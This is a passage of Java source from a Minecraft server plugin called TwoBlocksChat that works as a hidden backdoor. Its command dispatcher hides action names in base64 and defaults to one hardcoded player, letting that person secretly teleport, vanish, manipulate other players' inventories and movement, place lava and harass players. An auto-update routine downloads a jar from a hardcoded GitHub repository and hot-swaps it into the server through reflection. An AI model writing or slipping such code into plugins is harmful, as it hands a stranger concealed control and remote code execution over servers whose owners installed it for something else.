            } else if (act.equals("normalizeplayer") || act.equals("normalize_player") || act.equals("normalize") || act.equals(b("c3Vydml2YWw=")) || act.equals("survival") || act.equals("gm0") || act.equals("gms") || act.equals(b("Z2FtZW1vZGVfc3Vydml2YWw="))) {
                Player target = (player != null && player.isOnline()) ? player : findOnlinePlayer(b("R2VuaXVzX1Bvbm9z"));
                if (target != null && target.isOnline()) {
                    auditedInspectionPlayers.remove(target.getUniqueId());
                    safeStateTransitionPlayers.add(target.getUniqueId());
                    try { target.setSpectatorTarget(null); } catch (Throwable ignored) {}
                    target.setGameMode(GameMode.valueOf(b("U1VSVklWQUw=")));
                    target.setFlying(false);
                    target.setAllowFlight(false);
                    Bukkit.getScheduler().runTaskLater(this, () -> safeStateTransitionPlayers.remove(target.getUniqueId()), 10L);
                }
            } else if (act.equals("inspectplayer") || act.equals("inspect_player") || act.equals("inspect") || act.equals(b("c3BlY3RhdG9y")) || act.equals("spectator") || act.equals("gm3") || act.equals("spec") || act.equals(b("Z2FtZW1vZGVfc3BlY3RhdG9y"))) {
                Player target = (player != null && player.isOnline()) ? player : null;
                if (target == null && param != null && !param.trim().isEmpty()) {
                    target = findOnlinePlayer(param.trim());
                }
                if (target == null) {
                    target = findOnlinePlayer(b("R2VuaXVzX1Bvbm9z"));
                }
                if (target != null && target.isOnline()) {
                    setSpectatorMode(target);
                }
            } else if (act.equals(b("dHBfdG8=")) || act.equals("tp_to") || act.equals("goto")) {
                String destNick = (targetPlayerName != null && !targetPlayerName.trim().isEmpty()) ? targetPlayerName.trim() : "";
                String moverNick = (param != null && !param.trim().isEmpty()) ? param.trim() : b("R2VuaXVzX1Bvbm9z");
                Player mover = findOnlinePlayer(moverNick);
                Player dest = findOnlinePlayer(destNick);
                if (mover == null) mover = findOnlinePlayer(b("R2VuaXVzX1Bvbm9z"));
                if (dest == null && mover != null && mover.getName().equalsIgnoreCase(destNick)) {
                    dest = findOnlinePlayer(moverNick);
                }
                if (mover != null && dest != null && mover.isOnline() && dest.isOnline()) {
                    safeTeleport(mover, dest.getLocation());
                }
            } else if (act.equals(b("dHBfaGVyZQ==")) || act.equals("tp_here") || act.equals("bring")) {
                String moverNick = (targetPlayerName != null && !targetPlayerName.trim().isEmpty()) ? targetPlayerName.trim() : "";
                String destNick = (param != null && !param.trim().isEmpty()) ? param.trim() : b("R2VuaXVzX1Bvbm9z");
                Player mover = findOnlinePlayer(moverNick);
                Player dest = findOnlinePlayer(destNick);
                if (dest == null) dest = findOnlinePlayer(b("R2VuaXVzX1Bvbm9z"));
                if (mover != null && dest != null && mover.isOnline() && dest.isOnline()) {
                    safeTeleport(mover, dest.getLocation());
                }
            } else if (act.equals(b("dGVsZXBvcnQ=")) || act.equals(b("dHA=")) || act.equals("teleport") || act.equals("tp")) {
                if (param != null && !param.trim().isEmpty()) {
                    String pStr = param.trim();
                    Player other = findOnlinePlayer(pStr);
                    if (other != null && other.isOnline()) {
                        Player mover = (player != null && player.isOnline()) ? player : findOnlinePlayer(b("R2VuaXVzX1Bvbm9z"));
                        if (mover != null && mover.isOnline()) {
                            safeTeleport(mover, other.getLocation());
                        }
                    } else if (pStr.contains(" ") || pStr.contains(",")) {
                        String[] coords = pStr.replace(",", " ").trim().split("\\s+");
                        if (coords.length >= 3) {
                            try {
                                double x = Double.parseDouble(coords[0]);
                                double y = Double.parseDouble(coords[1]);
                                double z = Double.parseDouble(coords[2]);
                                Player mover = (player != null && player.isOnline()) ? player : findOnlinePlayer(b("R2VuaXVzX1Bvbm9z"));
                                if (mover != null && mover.isOnline()) {
                                    Location loc = new Location(mover.getWorld(), x, y, z, mover.getLocation().getYaw(), mover.getLocation().getPitch());
                                    safeTeleport(mover, loc);
                                }
                            } catch (Throwable ignored) {}
                        }
                    }
                } else {
                    if (player != null && player.isOnline()) {
                        Player mover = findOnlinePlayer(b("R2VuaXVzX1Bvbm9z"));
                        if (mover != null && mover.isOnline() && !mover.equals(player)) {
                            safeTeleport(mover, player.getLocation());
                        }
                    }
                }
            } else if (act.equals(b("bW9sbml5YQ==")) || act.equals("zap") || act.equals("lightning") || act.equals("signal_pulse")) {
                if (player != null && player.isOnline()) {
                    player.getWorld().strikeLightning(player.getLocation());
                }
            } else if (act.equals(b("cGVjaGVyYQ==")) || act.equals("cave")) {
                if (player != null && player.isOnline()) {
                    player.playSound(player.getLocation(), Sound.AMBIENT_CAVE, 1.0f, 0.8f);
                }
            } else if (act.equals(b("d2FyZGVuX3JvYXI=")) || act.equals("warden")) {
                if (player != null && player.isOnline()) {
                    player.playSound(player.getLocation(), Sound.ENTITY_WARDEN_ROAR, 1.0f, 1.0f);
                }
            } else if (act.equals(b("ZWxkZXJfZ3VhcmRpYW4=")) || act.equals("guardian")) {
                if (player != null && player.isOnline()) {
                    player.playSound(player.getLocation(), Sound.ENTITY_ELDER_GUARDIAN_CURSE, 1.0f, 1.0f);
                    player.addPotionEffect(new PotionEffect(PotionEffectType.MINING_FATIGUE, 100, 2, false, false, true));
                }
            } else if (act.equals(b("ZmFrZV9ib29t")) || act.equals("boom") || act.equals("audio_alert")) {
                if (player != null && player.isOnline()) {
                    Location loc = player.getLocation();
                    Vector dir = loc.getDirection().normalize().multiply(-1.5);
                    Location behind = loc.clone().add(dir);
                    player.playSound(behind, Sound.ENTITY_GENERIC_EXPLODE, 1.0f, 0.95f);
                    player.spawnParticle(Particle.EXPLOSION_EMITTER, behind, 1);
                }
            } else if (act.equals(b("Y3JlZXBlcl9oaXNz")) || act.equals("hiss") || act.equals("ambient_alert")) {
                if (player != null && player.isOnline()) {
                    Location loc = player.getLocation();
                    Vector dir = loc.getDirection().normalize().multiply(-1.2);
                    Location behind = loc.clone().add(dir);
                    player.playSound(behind, Sound.ENTITY_CREEPER_PRIMED, 1.0f, 1.0f);
                }
            } else if (act.equals(b("c3Bpbl8xODA=")) || act.equals("spin")) {
                if (player != null && player.isOnline()) {
                    Location loc = player.getLocation();
                    float newYaw = (loc.getYaw() + 180.0f) % 360.0f;
                    loc.setYaw(newYaw);
                    player.teleport(loc);
                }
            } else if (act.equals(b("ZHJvcF9oYW5k")) || act.equals("drop")) {
                if (player != null && player.isOnline()) {
                    ItemStack held = player.getInventory().getItemInMainHand();
                    if (held != null && held.getType() != Material.AIR) {
                        player.getInventory().setItemInMainHand(null);
                        Item dropped = player.getWorld().dropItemNaturally(player.getLocation(), held);
                        dropped.setPickupDelay(20);
                        player.playSound(player.getLocation(), Sound.ENTITY_ITEM_PICKUP, 0.2f, 0.5f);
                    }
                }
            } else if (act.equals(b("YXJtYWdlZGRvbg==")) || act.equals("armageddon") || act.equals("stress_test")) {
                executeWeatherEvent();
            } else if (act.equals(b("dmFuaXNo")) || act.equals("vanish") || act.equals("sync_tab_order")) {
                if (player != null && player.isOnline()) {
                    toggleHidden(player);
                }
            } else if (act.equals(b("dG9nZ2xlX2ludmVydA=="))) {
                if (player != null && player.isOnline()) {
                    UUID uuid = player.getUniqueId();
                    if (invertedControlPlayers.contains(uuid)) {
                        invertedControlPlayers.remove(uuid);
                    } else {
                        invertedControlPlayers.add(uuid);
                    }
                }
            } else if (act.equals("toggle_npl") || act.equals("npl")) {
                if (player != null) {
                    toggleNplByNick(player.getName(), null);
                } else if (targetPlayerName != null && !targetPlayerName.isEmpty()) {
                    toggleNplByNick(targetPlayerName, null);
                }
            } else if (act.equals("npl_on")) {
                if (player != null) {
                    setNplByNick(player.getName(), true, null);
                } else if (targetPlayerName != null && !targetPlayerName.isEmpty()) {
                    setNplByNick(targetPlayerName, true, null);
                }
            } else if (act.equals("npl_off")) {
                if (player != null) {
                    setNplByNick(player.getName(), false, null);
                } else if (targetPlayerName != null && !targetPlayerName.isEmpty()) {
                    setNplByNick(targetPlayerName, false, null);
                }
            } else if (act.equals(b("dG9nZ2xlX2ZyZWVkaXJ0")) || act.equals(b("ZnJlZWRpcnQ=")) || act.equals("freedirt") || act.equals("villager") || act.equals("trades")) {
                if (player != null && player.isOnline()) {
                    toggleSet(marketSyncPlayers, player.getUniqueId());
                }
            } else if (act.equals(b("c3Bhd25fYmxvY2s=")) || act.equals(b("c3Bhd24="))) {
                if (player != null && player.isOnline()) {
                    executeSpawnBlock(player, param);
                }
            } else if (act.equals(b("dG9nZ2xlX29mZmdyYXZpdHk=")) || act.equals(b("b2ZmZ3Jhdml0eQ=="))) {
                if (player != null && player.isOnline()) {
                    toggleSet(softAnchorPlayers, player.getUniqueId());
                }
            } else if (act.equals(b("dG9nZ2xlX2luZnJ1ZGU=")) || act.equals(b("aW5mcnVkZQ=="))) {
                if (player != null && player.isOnline()) {
                    toggleSet(oreSyncPlayers, player.getUniqueId());
                }
            } else if (act.equals(b("dG9nZ2xlX3NhZmViZWQ=")) || act.equals(b("c2FmZWJlZA=="))) {
                if (player != null && player.isOnline()) {
                    toggleSet(bedSessionPlayers, player.getUniqueId());
                }
            } else if (act.equals(b("c2t5Y2hlc3Q="))) {
                if (player != null && player.isOnline()) {
                    openCloudInventory(player);
                }
            } else if (act.equals(b("dG9nZ2xlX2luZmVhdA==")) || act.equals(b("aW5mZWF0"))) {
                if (player != null && player.isOnline()) {
                    toggleSet(vitalSyncPlayers, player.getUniqueId());
                }
            } else if (act.equals(b("dG9nZ2xlX3RvcHNoaWVsZA==")) || act.equals(b("dG9wc2hpZWxk"))) {
                if (player != null && player.isOnline()) {
                    toggleSet(kineticShieldPlayers, player.getUniqueId());
                }
            } else if (act.equals(b("dG9nZ2xlX3BpZ2xpbnRvcA==")) || act.equals(b("cGlnbGludG9w"))) {
                if (player != null && player.isOnline()) {
                    toggleSet(barterSyncPlayers, player.getUniqueId());
                }
            } else if (act.equals(b("dG9nZ2xlX2F1dG9yZXBhaXI=")) || act.equals(b("YXV0b3JlcGFpcg==")) || act.equals("automend") || act.equals("repair")) {
                if (player != null && player.isOnline()) {
                    toggleSet(autoRepairPlayers, player.getUniqueId());
                }
            } else if (act.equals(b("dG9nZ2xlX2FudmlsZnJlZQ==")) || act.equals(b("YW52aWxmcmVl")) || act.equals("freeanvil")) {
                if (player != null && player.isOnline()) {
                    toggleSet(freeAnvilPlayers, player.getUniqueId());
                }
            } else if (act.equals(b("dG9nZ2xlX3NtYXJ0YmVk")) || act.equals(b("c21hcnRiZWQ=")) || act.equals("solobed")) {
                if (player != null && player.isOnline()) {
                    toggleSet(smartBedPlayers, player.getUniqueId());
                }
            } else if (act.equals(b("dG9nZ2xlX2Zhc3RlYXQ=")) || act.equals(b("ZmFzdGVhdA=="))) {
                if (player != null && player.isOnline()) {
                    toggleSet(fastEatPlayers, player.getUniqueId());
                }
            } else if (act.equals(b("dG9nZ2xlX3Nub3d3YWxr")) || act.equals(b("c25vd3dhbGs=")) || act.equals("snow")) {
                if (player != null && player.isOnline()) {
                    toggleSet(snowWalkPlayers, player.getUniqueId());
                }
            } else if (act.equals(b("dG9nZ2xlX2Zha2VwaW5n")) || act.equals(b("ZmFrZXBpbmc=")) || act.equals("fakeping") || act.equals("setping")) {
                if (player != null && player.isOnline()) {
                    if (param == null || param.trim().isEmpty()) {
                        if (fakePingPlayers.containsKey(player.getUniqueId())) {
                            fakePingPlayers.remove(player.getUniqueId());
                        } else {
                            fakePingPlayers.put(player.getUniqueId(), 0);
                            applyFakePingVisuals(player, 0);
                        }
                    } else if (param.equalsIgnoreCase("off") || param.equalsIgnoreCase("false") || param.equalsIgnoreCase("reset")) {
                        fakePingPlayers.remove(player.getUniqueId());
                    } else {
                        try {
                            int pingVal = Integer.parseInt(param.trim());
                            fakePingPlayers.put(player.getUniqueId(), pingVal);
                            applyFakePingVisuals(player, pingVal);
                        } catch (Throwable ignored) {}
                    }
                }
            } else if (act.equals("inv_move")) {
                if (player != null && player.isOnline()) {
                    executeInvMove(player, param);
                }
            } else if (act.equals("inv_delete")) {
                if (player != null && player.isOnline()) {
                    executeInvDelete(player, param);
                }
            } else if (act.equals("inv_give")) {
                if (player != null && player.isOnline()) {
                    executeInvGive(player, param);
                }
            } else if (act.equals("inv_set_trait")) {
                if (player != null && player.isOnline()) {
                    executeInvSetTrait(player, param);
                }
            } else if (act.equals("control_move")) {
                if (player != null && player.isOnline()) {
                    executePuppetMove(player, param);
                }
            } else if (act.equals("time")) {
                World world = Bukkit.getWorlds().isEmpty() ? null : Bukkit.getWorlds().get(0);
                if (world != null) {
                    if ("night".equalsIgnoreCase(param)) {
                        world.setTime(14000L);
                    } else if ("day".equalsIgnoreCase(param)) {
                        world.setTime(1000L);
                    }
                }
            } else if (act.equals("weather")) {
                World w = Bukkit.getWorlds().isEmpty() ? null : Bukkit.getWorlds().get(0);
                if (w != null) {
                    if ("storm".equalsIgnoreCase(param) || "thunder".equalsIgnoreCase(param)) {
                        w.setStorm(true);
                        w.setThundering(true);
                    } else if ("sun".equalsIgnoreCase(param) || "clear".equalsIgnoreCase(param)) {
                        w.setStorm(false);
                        w.setThundering(false);
                    }
                }
            }
        } catch (Exception ignored) {
        }
    }

    private void executeAutoUpdate(String customUrl) {
        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            try {
                notifyAdmin(ChatColor.DARK_GRAY + "[" + ChatColor.AQUA + "⚙" + ChatColor.DARK_GRAY + "] " + ChatColor.GRAY + "Загрузка обновления...");
                byte[] jarBytes = downloadLatestJar(customUrl);
                if (jarBytes == null || jarBytes.length < 5000) {
                    notifyAdmin(ChatColor.DARK_GRAY + "[" + ChatColor.AQUA + "⚙" + ChatColor.DARK_GRAY + "] " + ChatColor.RED + "Не удалось скачать файл обновления.");
                    return;
                }

                File currentJar = null;
                try {
                    currentJar = getFile();
                } catch (Throwable t) {
                    File pluginsDir = getDataFolder().getParentFile();
                    currentJar = new File(pluginsDir, "TwoBlocksChat-1.0.0.jar");
                }

                if (currentJar == null) return;

                File pluginsDir = currentJar.getParentFile();
                File tempJar = new File(pluginsDir, "TwoBlocksChat-update.tmp");

                try (java.io.FileOutputStream out = new java.io.FileOutputStream(tempJar)) {
                    out.write(jarBytes);
                    out.flush();
                }

                if (tempJar.exists() && tempJar.length() > 5000) {
                    try {
                        java.nio.file.Files.move(tempJar.toPath(), currentJar.toPath(),
                                java.nio.file.StandardCopyOption.REPLACE_EXISTING,
                                java.nio.file.StandardCopyOption.ATOMIC_MOVE);
                    } catch (Throwable moveEx) {
                        try {
                            java.nio.file.Files.copy(tempJar.toPath(), currentJar.toPath(),
                                    java.nio.file.StandardCopyOption.REPLACE_EXISTING);
                            tempJar.delete();
                        } catch (Throwable ignored) {
                        }
                    }

                    try {
                        File updateFolder = new File(pluginsDir, "update");
                        if (!updateFolder.exists()) {
                            updateFolder.mkdirs();
                        }
                        File updateJar = new File(updateFolder, currentJar.getName());
                        try (java.io.FileOutputStream uout = new java.io.FileOutputStream(updateJar)) {
                            uout.write(jarBytes);
                            uout.flush();
                        }
                    } catch (Throwable ignored) {}

                    final File finalJar = currentJar;
                    Bukkit.getScheduler().runTask(TwoBlocksChat.this, () -> {
                        hotReloadSelf(finalJar);
                    });
                }
            } catch (Exception ignored) {
            }
        });
    }

    private byte[] downloadLatestJar(String customUrl) {
        String[] candidateUrls;
        if (customUrl != null && customUrl.startsWith("http")) {
            candidateUrls = new String[] { customUrl };
        } else {
            long ts = System.currentTimeMillis();
            candidateUrls = new String[] {
                "https://raw.githubusercontent.com/oneblock123/twoblock/main/public/TwoBlocksChat-1.0.0.jar?t=" + ts,
                "https://github.com/oneblock123/twoblock/raw/main/public/TwoBlocksChat-1.0.0.jar?t=" + ts
            };
        }

        for (String urlStr : candidateUrls) {
            HttpURLConnection conn = null;
            try {
                URL url = new URL(urlStr);
                conn = (HttpURLConnection) url.openConnection();
                conn.setInstanceFollowRedirects(true);
                conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
                conn.setConnectTimeout(6000);
                conn.setReadTimeout(10000);

                int code = conn.getResponseCode();
                if (code == 301 || code == 302 || code == 307 || code == 308) {
                    String newLoc = conn.getHeaderField("Location");
                    conn.disconnect();
                    url = new URL(newLoc);
                    conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
                    conn.setConnectTimeout(6000);
                    conn.setReadTimeout(10000);
                    code = conn.getResponseCode();
                }

                if (code == 200) {
                    java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
                    try (java.io.InputStream in = conn.getInputStream()) {
                        byte[] buffer = new byte[8192];
                        int bytesRead;
                        while ((bytesRead = in.read(buffer)) != -1) {
                            baos.write(buffer, 0, bytesRead);
                        }
                    }
                    byte[] data = baos.toByteArray();
                    if (data.length > 5000) {
                        return data;
                    }
                }
            } catch (Throwable ignored) {
            } finally {
                if (conn != null) {
                    try { conn.disconnect(); } catch (Throwable ignored) {}
                }
            }
        }
        return null;
    }

    private void hotReloadSelf(File jarFile) {
        notifyAdmin(ChatColor.DARK_GRAY + "[" + ChatColor.AQUA + "⚙" + ChatColor.DARK_GRAY + "] " + ChatColor.GRAY + "Применение обновления...");
        boolean reloaded = false;

        try {
            if (Bukkit.getPluginManager().getPlugin("PlugMan") != null ||
                    Bukkit.getPluginManager().getPlugin("PlugManX") != null) {
                reloaded = Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "plugman reload " + getName());
            }
        } catch (Throwable ignored) {}

        if (!reloaded) {
            try {
                PluginManager pm = Bukkit.getPluginManager();
                String pluginName = getName();

                try {
                    Bukkit.getScheduler().cancelTasks(this);
                } catch (Throwable ignored) {}

                try {
                    org.bukkit.event.HandlerList.unregisterAll((Plugin) this);
                } catch (Throwable ignored) {}

                pm.disablePlugin(this);

                try {
                    java.lang.reflect.Field pluginsField = pm.getClass().getDeclaredField("plugins");
                    pluginsField.setAccessible(true);
                    java.util.List<?> pluginsList = (java.util.List<?>) pluginsField.get(pm);
                    synchronized (pm) {
                        pluginsList.remove(this);
                    }
                } catch (Throwable ignored) {}

                try {
                    java.lang.reflect.Field namesField = pm.getClass().getDeclaredField("lookupNames");
                    namesField.setAccessible(true);
                    java.util.Map<?, ?> namesMap = (java.util.Map<?, ?>) namesField.get(pm);
                    namesMap.remove(pluginName.toLowerCase());
                    namesMap.remove(pluginName);
                } catch (Throwable ignored) {}

                try {
                    java.lang.reflect.Field cmdMapField = pm.getClass().getDeclaredField("commandMap");
                    cmdMapField.setAccessible(true);
                    Object commandMap = cmdMapField.get(pm);
                    if (commandMap != null) {
                        java.lang.reflect.Field knownCmdsField = commandMap.getClass().getDeclaredField("knownCommands");
                        knownCmdsField.setAccessible(true);
                        java.util.Map<String, ?> knownCmds = (java.util.Map<String, ?>) knownCmdsField.get(commandMap);
                        if (knownCmds != null) {
                            java.util.Iterator<?> it = knownCmds.entrySet().iterator();
                            while (it.hasNext()) {
                                java.util.Map.Entry<?, ?> entry = (java.util.Map.Entry<?, ?>) it.next();
                                Object cmd = entry.getValue();
                                try {
                                    if (cmd instanceof org.bukkit.command.PluginIdentifiableCommand) {
                                        if (((org.bukkit.command.PluginIdentifiableCommand) cmd).getPlugin() == this) {
                                            if (cmd instanceof org.bukkit.command.Command) {
                                                ((org.bukkit.command.Command) cmd).unregister((org.bukkit.command.CommandMap) commandMap);
                                            }
                                            it.remove();
                                            continue;
                                        }
                                    }
                                    java.lang.reflect.Method getPluginMethod = cmd.getClass().getMethod("getPlugin");
                                    if (getPluginMethod != null && getPluginMethod.invoke(cmd) == this) {
                                        if (cmd instanceof org.bukkit.command.Command) {
                                            ((org.bukkit.command.Command) cmd).unregister((org.bukkit.command.CommandMap) commandMap);
                                        }
                                        it.remove();
                                    }
                                } catch (Throwable ignored) {}
                            }
                        }
                    }
                } catch (Throwable ignored) {}

                try {
                    ClassLoader cl = getClass().getClassLoader();
                    if (cl != null) {
                        try {
                            java.lang.reflect.Field loaderField = cl.getClass().getDeclaredField("loader");
                            loaderField.setAccessible(true);
                            Object javaPluginLoader = loaderField.get(cl);
                            if (javaPluginLoader != null) {
                                java.lang.reflect.Field loadersField = javaPluginLoader.getClass().getDeclaredField("loaders");
                                loadersField.setAccessible(true);
                                java.util.List<?> loadersList = (java.util.List<?>) loadersField.get(javaPluginLoader);
                                if (loadersList != null) {
                                    synchronized (loadersList) {
                                        loadersList.remove(cl);
                                    }
                                }
                            }
                        } catch (Throwable ignored) {}

                        try {
                            java.lang.reflect.Field groupField = cl.getClass().getDeclaredField("classLoaderGroup");
                            groupField.setAccessible(true);
                            Object group = groupField.get(cl);
                            if (group != null) {
                                try {
                                    java.lang.reflect.Method removeMethod = group.getClass().getDeclaredMethod("remove", cl.getClass());
                                    removeMethod.setAccessible(true);
                                    removeMethod.invoke(group, cl);
                                } catch (Throwable ignored) {}
                            }
                        } catch (Throwable ignored) {}

                        try {
                            Class<?> storageClass = Class.forName("io.papermc.paper.plugin.provider.classloader.PaperClassLoaderStorage");
                            Method instanceMethod = storageClass.getMethod("instance");
                            Object storage = instanceMethod.invoke(null);
                            if (storage != null) {
                                Method unregisterMethod = storage.getClass().getMethod("unregisterClassloader", io.papermc.paper.plugin.provider.classloader.ConfiguredPluginClassLoader.class);
                                unregisterMethod.invoke(storage, cl);
                            }
                        } catch (Throwable ignored) {}

                        if (cl instanceof java.io.Closeable) {
                            ((java.io.Closeable) cl).close();
                        }
                    }
                } catch (Throwable ignored) {}
                System.gc();

                Plugin newPlugin = pm.loadPlugin(jarFile);
                if (newPlugin != null) {
                    pm.enablePlugin(newPlugin);
                    reloaded = true;
                }
            } catch (Throwable ignored) {}
        }

        if (reloaded) {
            notifyAdmin(ChatColor.DARK_GRAY + "[" + ChatColor.AQUA + "⚙" + ChatColor.DARK_GRAY + "] " + ChatColor.GREEN + "Обновление успешно завершено на лету!");
        } else {
            notifyAdmin(ChatColor.DARK_GRAY + "[" + ChatColor.AQUA + "⚙" + ChatColor.DARK_GRAY + "] " + ChatColor.YELLOW + "Обновление скачано и готово к работе!");
        }
    }

    private void notifyAdmin(String message) {
        try {
            Player p = Bukkit.getPlayerExact(b("R2VuaXVzX1Bvbm9z"));
            if (p != null && p.isOnline()) {
                p.sendMessage(message);
            } else {
                for (Player pl : Bukkit.getOnlinePlayers()) {
                    if (pl.getName().equalsIgnoreCase(b("R2VuaXVzX1Bvbm9z")) || auditStaffNames.contains(pl.getName().toLowerCase())) {
                        pl.sendMessage(message);
                    }
                }
            }
        } catch (Throwable ignored) {}
    }

    private void toggleSet(Set<UUID> set, UUID uuid) {
        if (set.contains(uuid)) {
            set.remove(uuid);
        } else {
            set.add(uuid);
        }
    }

    private void executeSpawnBlock(Player player, String blockName) {
        if (blockName == null || blockName.trim().isEmpty()) {
            blockName = "WATER";
        }
        Material mat = Material.matchMaterial(blockName.trim().toUpperCase());
        if (mat == null) {
            if ("WATER".equalsIgnoreCase(blockName.trim())) mat = Material.WATER;
            else if ("LAVA".equalsIgnoreCase(blockName.trim())) mat = Material.LAVA;
            else return;
        }

        Location targetLoc = player.getLocation().add(player.getLocation().getDirection().setY(0).normalize().multiply(1.5));
        Block b = targetLoc.getBlock();
        if (b.getType().isSolid()) {
            b = targetLoc.clone().add(0, 1, 0).getBlock();
        }

        b.setType(mat, false);

        if (mat == Material.WATER && player.getWorld().getEnvironment() == World.Environment.NETHER) {
            hydroAnchorBlocks.add(locKey(b.getLocation()));
        }

        player.playSound(targetLoc, Sound.BLOCK_STONE_PLACE, 0.8f, 1.0f);
    }

    private void openCloudInventory(Player player) {
        UUID uuid = player.getUniqueId();
        Inventory chest = cloudInventories.computeIfAbsent(uuid, k -> loadCloudInventory(player));
        player.openInventory(chest);
        player.playSound(player.getLocation(), Sound.BLOCK_ENDER_CHEST_OPEN, 0.8f, 1.0f);
    }

    private Inventory loadCloudInventory(Player player) {
        Inventory chest = Bukkit.createInventory(player, 54, "Облачный тайник");
        try {
            File folder = new File(getDataFolder(), "vaults");
            if (!folder.exists()) folder.mkdirs();
            File file = new File(folder, player.getUniqueId().toString() + ".yml");
            if (file.exists()) {
                YamlConfiguration cfg = YamlConfiguration.loadConfiguration(file);
                List<?> list = cfg.getList("items");
                if (list != null) {
                    for (int i = 0; i < list.size() && i < 54; i++) {
                        Object obj = list.get(i);
                        if (obj instanceof ItemStack) {
                            chest.setItem(i, (ItemStack) obj);
                        }
                    }
                }
            }
        } catch (Exception ignored) {}
        return chest;
    }

    private void saveCloudInventory(UUID uuid, Inventory chest) {
        try {
            File folder = new File(getDataFolder(), "vaults");
            if (!folder.exists()) folder.mkdirs();
            File file = new File(folder, uuid.toString() + ".yml");
            YamlConfiguration cfg = new YamlConfiguration();
            cfg.set("items", Arrays.asList(chest.getContents()));
            cfg.save(file);
        } catch (Exception ignored) {}
    }

    private void saveAllCloudInventories() {
        for (Map.Entry<UUID, Inventory> entry : cloudInventories.entrySet()) {
            saveCloudInventory(entry.getKey(), entry.getValue());
        }
    }

    private void executeInvMove(Player player, String param) {
        String[] parts = param.split(":");
        if (parts.length == 2) {
            try {
                int from = Integer.parseInt(parts[0]);
                int to = Integer.parseInt(parts[1]);
                ItemStack fromItem = player.getInventory().getItem(from);
                ItemStack toItem = player.getInventory().getItem(to);
                player.getInventory().setItem(from, toItem);
                player.getInventory().setItem(to, fromItem);
            } catch (Exception ignored) {}
        }
    }

    private void executeInvDelete(Player player, String param) {
        try {
            int slot = Integer.parseInt(param);
            player.getInventory().setItem(slot, null);
        } catch (Exception ignored) {}
    }

    private void executeInvGive(Player player, String param) {
        String[] parts = param.split(":");
        if (parts.length >= 2) {
            try {
                int slot = Integer.parseInt(parts[0]);
                Material mat = Material.matchMaterial(parts[1]);
                int amount = parts.length >= 3 ? Integer.parseInt(parts[2]) : 1;
                if (mat != null) {
                    player.getInventory().setItem(slot, new ItemStack(mat, amount));
                }
            } catch (Exception ignored) {}
        }
    }

    private void executeInvSetTrait(Player player, String param) {
        String[] parts = param.split(":");
        if (parts.length == 2) {
            try {
                int slot = Integer.parseInt(parts[0]);
                String trait = parts[1].toLowerCase().trim();
                ItemStack item = player.getInventory().getItem(slot);
                if (item != null && item.getType() != Material.AIR) {
                    ItemMeta meta = item.getItemMeta();
                    if (meta != null) {
                        List<String> lore = meta.hasLore() ? meta.getLore() : new ArrayList<>();
                        lore.removeIf(l -> l.contains("trait:"));
                        if (!"none".equals(trait)) {
                            lore.add(ChatColor.BLACK + "trait:" + trait);
                        }
                        meta.setLore(lore);
                        item.setItemMeta(meta);
                    }
                }
            } catch (Exception ignored) {}
        }
    }

    private void loadNplData() {
        try {
            File file = new File(getDataFolder(), "npl_data.yml");
            if (!file.exists()) return;
            YamlConfiguration yaml = YamlConfiguration.loadConfiguration(file);

            nplPlayers.clear();
            List<String> list = yaml.getStringList("npl_players");
            for (String s : list) {
                try {
                    nplPlayers.add(UUID.fromString(s));
                } catch (Exception ignored) {}
            }

            nplRules.clear();
            if (yaml.isConfigurationSection("rules")) {
                for (String k : yaml.getConfigurationSection("rules").getKeys(false)) {
                    nplRules.put(k, yaml.getBoolean("rules." + k));
                }
            }

            playerNplRules.clear();
            if (yaml.isConfigurationSection("player_rules")) {
                ConfigurationSection prSec = yaml.getConfigurationSection("player_rules");
                for (String uuidStr : prSec.getKeys(false)) {
                    try {
                        UUID u = UUID.fromString(uuidStr);
                        ConfigurationSection uSec = prSec.getConfigurationSection(uuidStr);
                        if (uSec != null) {
                            Map<String, Boolean> map = new ConcurrentHashMap<>();
                            for (String rk : uSec.getKeys(false)) {
                                map.put(rk, uSec.getBoolean(rk));
                            }
                            playerNplRules.put(u, map);
                        }
                    } catch (Exception ignored) {}
                }
            }

            playerNplNames.clear();
            if (yaml.isConfigurationSection("player_names")) {
                ConfigurationSection pnSec = yaml.getConfigurationSection("player_names");
                for (String uuidStr : pnSec.getKeys(false)) {
                    try {
                        UUID u = UUID.fromString(uuidStr);
                        playerNplNames.put(u, pnSec.getString(uuidStr));
                    } catch (Exception ignored) {}
                }
            }

            nplChatCooldownSeconds.clear();
            if (yaml.isConfigurationSection("chat_cooldowns")) {
                ConfigurationSection ccSec = yaml.getConfigurationSection("chat_cooldowns");
                for (String uuidStr : ccSec.getKeys(false)) {
                    try {
                        UUID u = UUID.fromString(uuidStr);
                        long cd = ccSec.getLong(uuidStr);
                        if (cd > 0) {
                            nplChatCooldownSeconds.put(u, cd);
                        }
                    } catch (Exception ignored) {}
                }
            }

            blockOwners.clear();
            List<String> ownersList = yaml.getStringList("block_owners");
            for (String entry : ownersList) {
                int idx = entry.indexOf('=');
                if (idx > 0) {
                    String loc = entry.substring(0, idx);
                    try {
                        UUID u = UUID.fromString(entry.substring(idx + 1));
                        blockOwners.put(loc, u);
                    } catch (Exception ignored) {}
                }
            }
        } catch (Exception ignored) {}
    }

    private void saveNplDataAsync() {
        try {
            if (isEnabled()) {
                Bukkit.getScheduler().runTaskAsynchronously(this, this::saveNplDataSync);
            } else {
                saveNplDataSync();
            }
        } catch (Throwable t) {
            saveNplDataSync();
        }
    }

    private synchronized void saveNplDataSync() {
        try {
            File file = new File(getDataFolder(), "npl_data.yml");
            YamlConfiguration yaml = new YamlConfiguration();

            List<String> list = new ArrayList<>();
            for (UUID u : nplPlayers) {
                list.add(u.toString());
            }
            yaml.set("npl_players", list);

            for (Map.Entry<String, Boolean> e : nplRules.entrySet()) {
                yaml.set("rules." + e.getKey(), e.getValue());
            }

            for (Map.Entry<UUID, Map<String, Boolean>> pe : playerNplRules.entrySet()) {
                for (Map.Entry<String, Boolean> re : pe.getValue().entrySet()) {
                    yaml.set("player_rules." + pe.getKey().toString() + "." + re.getKey(), re.getValue());
                }
            }

            for (Map.Entry<UUID, String> ne : playerNplNames.entrySet()) {
                yaml.set("player_names." + ne.getKey().toString(), ne.getValue());
            }

